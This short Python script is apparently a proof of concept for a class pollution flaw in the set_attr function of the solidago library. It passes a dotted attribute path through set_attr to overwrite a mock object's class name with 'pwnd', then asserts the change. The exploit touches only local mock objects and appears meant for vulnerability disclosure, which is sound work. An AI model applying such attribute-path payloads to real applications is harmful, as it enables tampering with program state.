# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: set_attr (solidago/experiments/synthetic.py)
# Type: get-attr-set-attr

from solidago.experiments.synthetic import set_attr

class Target: pass
target = Target()

class MockGenerativeModel: pass
generative_model = MockGenerativeModel()
generative_model.target = target

payload_value = "pwnd"
PAYLOAD = "generative_model.target.__class__.__name__"

def run_poc():
  set_attr(PAYLOAD, payload_value, generative_model, None)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
